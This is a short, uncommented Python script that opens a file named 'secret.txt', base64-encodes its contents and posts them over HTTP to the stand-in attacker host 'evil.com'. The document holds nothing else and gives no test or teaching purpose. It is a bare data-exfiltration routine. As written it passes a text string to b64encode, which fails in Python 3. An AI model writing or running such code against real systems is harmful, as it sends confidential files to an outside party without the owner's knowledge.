import base64
import requests

with open("secret.txt") as f:

    all_data = f.read()

encoded = base64.b64encode(all_data)

requests.post(
    "http://evil.com",
    data=encoded
)